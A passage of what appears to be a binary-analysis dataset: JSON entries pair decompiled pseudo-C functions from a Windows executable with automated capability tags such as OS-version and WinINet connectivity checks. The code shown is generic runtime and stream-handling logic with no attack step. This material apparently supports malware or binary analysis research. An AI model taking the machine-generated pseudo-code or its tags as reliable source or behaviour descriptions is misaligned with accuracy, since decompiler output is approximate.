(**(*var_8h + 8))();\n        *in_FS_OFFSET = uStackY108;\n        *in_FS_OFFSET = uStackY96;\n        puStackY88 = 0x41b484;\n        uStackY92 = 0x4962e4;\n        uStackY96 = 0x41b47c;\n        sub.kernel32.dll_EnterCriticalSection();\n        return;\n    }\n    *in_FS_OFFSET = uStackY80;\n    puStackY72 = 0x41b4e1;\n    uStackY76 = 0x41b4d9;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 1039
    },
    "0041b558": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041b558(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404324();\n    fcn.0041b7c0();\n    if (*(iVar1 + 0x14) != 0) {\n        while ((*(iVar1 + 0x14) != 0 && (0 < *(*(iVar1 + 0x14) + 8)))) {\n            piVar2 = fcn.00414eec();\n            (**(*piVar2 + 0x10))();\n        }\n        fcn.0040e118();\n    }\n    fcn.0041b764();\n    if (*(iVar1 + 4) != 0) {\n        fcn.0041b72c();\n    }\n    fcn.004154d8();\n    if ('\\0' < extraout_DL) {\n        fcn.004042cc();\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "0041b5e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b5e0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 4) == 0) || (*(in_EAX + 4) != *(param_2 + 4))) {\n        if (*(in_EAX + 0x14) == 0) {\n            uVar1 = fcn.00403f28();\n            *(in_EAX + 0x14) = uVar1;\n        }\n        iVar2 = fcn.00414f48();\n        if (iVar2 < 0) {\n            fcn.00414d8c();\n            fcn.0041b5e0();\n        }\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x100;\n    return;\n}\n",
        "token_count": 211
    },
    "0041b674": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b674(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        uVar1 = fcn.00403f28();\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.00414d8c();\n    *(param_2 + 4) = in_EAX;\n    return;\n}\n",
        "token_count": 115
    },
    "0041b6a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b6a0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(param_2 + 4) = 0;\n    fcn.00415088();\n    if (*(*(in_EAX + 0x10) + 8) == 0) {\n        fcn.00403f58();\n        *(in_EAX + 0x10) = 0;\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0041b7fc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041b7fc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        fcn.00415088();\n        if (*(*(in_EAX + 0x14) + 8) == 0) {\n            fcn.00403f58();\n            *(in_EAX + 0x14) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0041b994": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b994(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        cVar1 = fcn.00408b5c();\n        if ((cVar1 == '\\0') && (in_EAX == *(in_EDX + 4))) {\n            iVar2 = fcn.0041ba2c();\n            if (iVar2 != 0) {\n                var_ch = arg_8h;\n                var_8h._0_1_ = 0xb;\n                fcn.0040c6a4(0, &var_ch);\n                fcn.004047cc();\n            }\n        }\n    }\n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 4) != 0)) {\n        (**(**(in_EAX + 4) + 0x20))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 271
    },
    "0041ba2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041ba2c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (((param_2 != 0) && (*(in_EAX + 0x10) != 0)) && (iVar3 = *(*(in_EAX + 0x10) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00414eec();\n            cVar1 = fcn.00408b5c();\n            if (cVar1 != '\\0') goto code_r0x0041ba71;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    uVar2 = 0;\ncode_r0x0041ba71:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 210
    },
    "0041bb20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041bb20(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10) == 0) {\n        fcn.00414e78();\n    }\n    fcn.00414eec();\n    return;\n}\n",
        "token_count": 61
    },
    "0041bbb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bbb0(char param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 == '\\0') {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) & 0xffef;\n    }\n    else {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 0x10;\n    }\n    if ((param_1 != '\\0') && (iVar1 = fcn.0041bb4c(),  -1 < iVar1 + -1)) {\n        do {\n            fcn.0041bb20();\n            fcn.0041bbb0();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "0041bccc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bccc(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        cVar1 = fcn.0040400c();\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = (****(arg_8h + 0x20))(*(arg_8h + 0x20), arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 163
    },
    "0041bd0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bd0c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 4))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0041bd2c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bd2c(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x20) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0x20) + 8))(*(arg_8h + 0x20));\n    }\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0041c0c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c0c0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c10f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0xc))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "0041c128": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c128(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c177;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch == 0) {\n        uVar1 = 0x80030009;\n        *in_FS_OFFSET = uStack28;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 0xc) + 0x10))();\n        if (arg_14h != NULL) {\n            *arg_14h = uVar1;\n        }\n        uVar1 = 0;\n        *in_FS_OFFSET = uStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "0041c190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c190(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41c1fa;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "0041c278": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041c278(int32_t arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint32_t *arg_18h, uint32_t *arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    puStack60 = 0x41c289;\n    fcn.004065e4();\n    uStack64 = 0x41c46b;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_4h = 0;\n    var_18h = 0;\n    var_14h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack76 = 0x41c444;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    if (arg_14h == 0) {\n        if (arg_10h < 0x100001) {\ncode_r0x0041c2e2:\n            var_ch = arg_10h;\n            goto code_r0x0041c2e8;\n        }\n    }\n    else if (arg_14h < 1) goto code_r0x0041c2e2;\n    var_ch = 0x100000;\ncode_r0x0041c2e8:\n    puStack84 = 0x41c2f0;\n    puStack60 = &stack0xfffffffc;\n    var_8h = fcn.00402ce4();\n    uStack88 = 0x41c433;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    do {\n        if (arg_14h == 0) {\n            if (arg_10h == 0) {\ncode_r0x0041c3f3:\n                *in_FS_OFFSET = uStack92;\n                puStack84 = 0x41c43a;\n                uStack88 = 0x41c408;\n                fcn.00402d00();\n                if (arg_1ch != NULL) {\n                    *arg_1ch = var_20h;\n                    arg_1ch[1] = var_1ch;\n                }\n                if (arg_18h != NULL) {\n                    *arg_18h = var_18h;\n                    arg_18h[1] = var_14h;\n                }\n                return;\n            }\n        }\n        else if (arg_14h < 1) goto code_r0x0041c3f3;\n        uVar1 = arg_10h;\n        if (arg_14h == 0) {\n            if (0x7fffffff < arg_10h) {\ncode_r0x0041c319:\n                uVar1 = 0x7fffffff;\n            }\n        }\n        else if (0 < arg_14h) goto code_r0x0041c319;\n        for (; 0 < uVar1; uVar1 = uVar1 - uVar2) {\n            var_10h = uVar1;\n            if (var_ch < uVar1) {\n                var_10h = var_ch;\n            }\n            uVar2 = (**(**(arg_8h + 0xc) + 0xc))();\n            if (uVar2 == 0) {\n                fcn.00404878();\n                *in_FS_OFFSET = uStack92;\ncode_r0x0041c455:\n                *in_FS_OFFSET = uStack80;\n                puStack72 = 0x41c472;\n                uStack76 = 0x41c46a;\n                fcn.00406570();\n                return;\n            }\n            bVar3 = CARRY4(var_18h, uVar2);\n            var_18h = var_18h + uVar2;\n            var_14h = var_14h + (uVar2 >> 0x1f) + bVar3;\n            var_28h = 0;\n            var_24h = 0;\n            var_4h = (**(*arg_ch + 0x10))(arg_ch, var_8h, uVar2, &fcn.0041c278::var_28h);\n            bVar3 = CARRY4(var_20h, var_28h);\n            var_20h = var_20h + var_28h;\n            var_1ch = var_1ch + var_24h + bVar3;\n            if ((var_4h == 0) && (uVar2 != var_28h)) {\n                var_4h = -0x7fffbffb;\n            }\n            if (var_4h != 0) {\n                fcn.00404878();\n                *in_FS_OFFSET = uStack92;\n                goto code_r0x0041c455;\n            }\n            bVar3 = arg_10h < uVar2;\n            arg_10h = arg_10h - uVar2;\n            arg_14h = (arg_14h - (uVar2 >> 0x1f)) - bVar3;\n        }\n    } while( true );\n}\n",
        "token_count": 1331
    },
    "0041c5e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0041c5e0(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    puVar1 = *0x4962fc;\n    if (*0x496300 == NULL) {\n        puVar1 = sub.kernel32.dll_VirtualAlloc_1(0, 0x1000, 0x1000, 0x40);\n        *puVar1 = *0x4962fc;\n        fcn.00402ee0();\n        uVar2 = fcn.0041c5d8();\n        *(puVar1 + 6) = uVar2;\n        puVar3 = puVar1 + 10;\n        do {\n            puVar4 = puVar3;\n            *puVar4 = 0xe8;\n            uVar2 = fcn.0041c5d8();\n            *(puVar4 + 1) = uVar2;\n            *(puVar4 + 5) = *0x496300;\n            puVar3 = puVar4 + 0xd;\n            *0x496300 = puVar4;\n        } while ((puVar4 + 0xd) - puVar1 < 0xffc);\n    }\n    *0x4962fc = puVar1;\n    puVar3 = *0x496300;\n    puVar1 = *0x496300 + 5;\n    *0x496300 = *(*0x496300 + 5);\n    *puVar1 = arg_8h;\n    *(puVar3 + 9) = arg_ch;\n    return puVar3;\n}\n",
        "token_count": 373
    },
    "0041c69c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c69c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint lpWndClass;\n    code *var_24h;\n    \n    *0x490b0c = *0x4957f4;\n    iVar1 = sub.user32.dll_GetClassInfoA(*0x4957f4, *0x490b20, &lpWndClass);\n    if ((iVar1 == 0) || (var_24h != sub.user32.dll_DefWindowProcA)) {\n        if (iVar1 != 0) {\n            sub.user32.dll_UnregisterClassA(*0x490b20, *0x4957f4);\n        }\n        sub.user32.dll_RegisterClassA(0x490afc);\n    }\n    uVar2 = fcn.0040775c(0, *0x4957f4, 0, 0, 0, 0, 0, 0, 0x80000000);\n    if (arg_8h._2_2_ != 0) {\n        uVar3 = fcn.0041c5e0(arg_8h, arg_ch);\n        sub.user32.dll_SetWindowLongA(uVar2, 0xfffffffc, uVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 302
    },
    "0041cdec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041cdec(void)\n\n{\n    if (*0x496308 == 0) {\n        *0x496308 = fcn.0041ce50();\n    }\n    return;\n}\n",
        "token_count": 45
    },
    "0041ce08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ce08(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    if (in_EAX != NULL) {\n        *in_EAX = 0;\n    }\n    fcn.0041cdec();\n    uVar1 = fcn.004065b4();\n    return uVar1 & 0xffffff00 | *in_EAX != 0;\n}\n",
        "token_count": 95
    },
    "0041cf34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041cf34(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41d0c6;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(*(in_EAX + 0x10) + 8) == 1) {\n        puStack44 = 0x41cf63;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0041c994();\n        puStack44 = 0x41cf6b;\n        cVar2 = (**(**(iVar3 + 4) + 0x18))();\n        if (cVar2 != '\\0') {\n            puStack44 = 0x41cf7d;\n            iVar3 = fcn.0041c994();\n            puStack44 = 0x41cf85;\n            (**(**(iVar3 + 4) + 0x1c))();\n        }\n    }\n    else {\n        if (*(in_EAX + 0xc) != 0) {\n            puStack44 = 0x41cfa0;\n            puStack32 = &stack0xfffffffc;\n            piVar4 = fcn.00403f28();\n            uStack48 = 0x41d061;\n            uStack52 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffcc;\n            var_ch = *(*(in_EAX + 0x10) + 8);\n            puStack44 = &stack0xfffffffc;\n            puVar1 = &stack0xfffffffc;\n            if (-1 < var_ch + -1) {\n                do {\n                    puStack44 = puVar1;\n                    iVar3 = fcn.0041c994();\n                    cVar2 = (**(**(iVar3 + 4) + 0x18))();\n                    if (cVar2 != '\\0') {\n                        (**(**(iVar3 + 4) + 0xc))();\n                        (**(*piVar4 + 0x3c))();\n                    }\n                    var_ch = var_ch + -1;\n                    puVar1 = puStack44;\n                } while (var_ch != 0);\n            }\n            iVar3 = (**(*piVar4 + 0x14))();\n            if (iVar3 < 2) {\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            else {\n                (**(*piVar4 + 0x90))();\n                (**(**(in_EAX + 0xc) + 0x10))();\n                iVar3 = (**(*piVar4 + 0x18))();\n                (**(**(iVar3 + 4) + 0x1c))();\n            }\n            *in_FS_OFFSET = uStack52;\n            puStack44 = 0x41d0b0;\n            uStack48 = 0x41d060;\n            fcn.00403f58();\n            return;\n        }\n        puVar1 = &stack0xfffffffc;\n        if (0 < *(*(in_EAX + 0x10) + 8)) {\n            puStack44 = 0x41d07a;\n            iVar3 = fcn.0041c994();\n            puStack44 = 0x41d082;\n            cVar2 = (**(**(iVar3 + 4) + 0x18))();\n            puVar1 = puStack32;\n            if (cVar2 != '\\0') {\n                puStack44 = 0x41d090;\n                iVar3 = fcn.0041c994();\n                puStack44 = 0x41d098;\n                (**(**(iVar3 + 4) + 0x1c))();\n                goto code_r0x0041d0b0;\n            }\n        }\n        puStack32 = puVar1;\n        puStack44 = 0x41d0ab;\n        fcn.0040c668();\n        puStack44 = 0x41d0b0;\n        fcn.004047cc();\n    }\ncode_r0x0041d0b0:\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41d0cd;\n    uStack36 = 0x41d0c5;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1074
    },
    "0041d1dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041d1dc(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStackY88;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x41d400;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    var_14h = 0;\n    iVar5 = 0;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        fcn.00404df4();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    iVar3 = *(*(var_8h + 0x10) + 8);\n    if (0 < iVar3) {\n        if (-1 < iVar3 + -1) {\n            iVar4 = 0;\n            do {\n                iVar2 = fcn.0041c994();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    iVar5 = iVar5 + 1;\n                    var_14h = iVar4;\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        if (iVar5 == 0) {\n            var_2ch = fcn.00405264();\n            var_28h._0_1_ = 6;\n            uStackY88 = 0x41d284;\n            fcn.0040c6a4(0, &fcn.0041d1dc::var_2ch);\n            uStackY88 = 0x41d289;\n            fcn.004047cc();\n        }\n        if (iVar5 != 1) {\n            var_18h = fcn.00403f28();\n            uStackY88 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffa8;\n            iVar5 = *(*(var_8h + 0x10) + 8);\n            if (-1 < iVar5 + -1) {\n                do {\n                    var_20h = fcn.0041c994();\n                    iVar3 = (**(**(var_20h + 4) + 0x10))();\n                    if (0 < iVar3) {\n                        var_1ch = (**(**(var_20h + 4) + 0x14))();\n                        iVar3 = (**(*var_1ch + 0x14))();\n                        if (-1 < iVar3 + -1) {\n                            var_10h = 0;\n                            var_24h = iVar3;\n                            do {\n                                (**(*var_1ch + 0xc))();\n                                (**(*var_18h + 0x3c))();\n                                var_10h = var_10h + 1;\n                                var_24h = var_24h + -1;\n                            } while (var_24h != 0);\n                        }\n                        fcn.00403f58();\n                    }\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            if (*(var_8h + 0xc) == 0) {\n                iVar5 = (**(*var_18h + 0x18))();\n                (**(*var_18h + 0xc))();\n                (**(**(iVar5 + 4) + 0x20))();\n            }\n            else {\n                (**(*var_18h + 0x90))();\n                iVar5 = (**(**(var_8h + 0xc) + 0xc))();\n                if (-1 < iVar5) {\n                    iVar5 = (**(*var_18h + 0x18))();\n                    (**(*var_18h + 0xc))();\n                    (**(**(iVar5 + 4) + 0x20))();\n                }\n            }\n            *in_FS_OFFSET = uStackY88;\n            fcn.00403f58();\n            return;\n        }\n        iVar5 = fcn.0041c994();\n        (**(**(iVar5 + 4) + 0x20))();\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x41d407;\n    uStack72 = 0x41d3f7;\n    fcn.00404da0();\n    uStack72 = 0x41d3ff;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1192
    },
    "0041d4a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
